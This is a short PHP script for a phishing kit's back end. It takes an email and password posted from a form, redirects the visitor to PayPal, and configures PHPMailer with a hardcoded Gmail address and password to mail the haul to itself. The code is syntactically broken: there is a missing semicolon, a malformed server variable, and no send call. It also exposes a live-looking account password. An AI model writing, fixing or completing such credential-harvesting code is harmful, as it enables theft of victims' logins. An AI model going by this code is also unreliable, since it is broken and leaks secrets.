<?php

require "PHPMailer/Exception.php";
require "PHPMailer/PHPMailer.php";
require "PHPMailer/SMTP.php";
 
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
 
$oMail= new PHPMailer();
$oMail->isSMTP();
$oMail->Host="smtp.gmail.com";
$oMail->Port=587;
$oMail->SMTPSecure="tls";
$oMail->SMTPAuth=true;
$oMail->Username="sebastiandiazdiaz2818@gmail.com";
$oMail->Password="Sebas7.,";
$oMail->setFrom("sebastiandiazdiaz2818@gmail.com","Minty");
$oMail->addAddress("sebastiandiazdiaz2818@gmail.com","Minty2");
$oMail->Subject="Informacion 100% legal"

if ($.SERVER["REQUEST_METHOD] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    header("Location: https://www.paypal.com");
    exit();
    
 }
 
 ?>
